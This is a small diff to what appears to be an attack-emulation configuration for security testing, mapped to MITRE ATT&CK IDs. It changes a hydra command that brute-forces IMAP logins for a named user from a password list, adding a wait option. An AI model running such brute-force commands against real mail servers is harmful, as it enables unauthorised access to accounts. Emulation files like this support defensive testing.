@@ -24,7 +24,7 @@ commands:
     random: true
 
   - type: shell
-    cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -s 143 $SERVER_ADDRESS imap  
+    cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -c 5 -s 143 $SERVER_ADDRESS imap  
     metadata:
       techniques: "T1078.002,T1110.001,T1133"
       tactics: "Initial Access"
